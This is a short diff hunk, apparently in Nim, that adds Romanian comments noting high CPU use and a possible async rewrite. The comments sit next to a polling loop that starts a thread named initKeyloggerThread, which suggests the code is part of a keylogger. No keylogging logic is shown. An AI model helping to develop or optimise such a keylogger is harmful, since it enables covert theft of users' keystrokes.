@@ -27,6 +27,9 @@ open mainThread
 
 createThread(thr, initKeyloggerThread)
 
+## NEVOIE DE OPTIMIZARI
+## CONSUMA PREA MULT CPU
+## CRED CA O SA TREBUIASCA SA IMPLEMENTEZ CV ASYNC
 while true:
   let channel = mainThread.tryRecv()
 
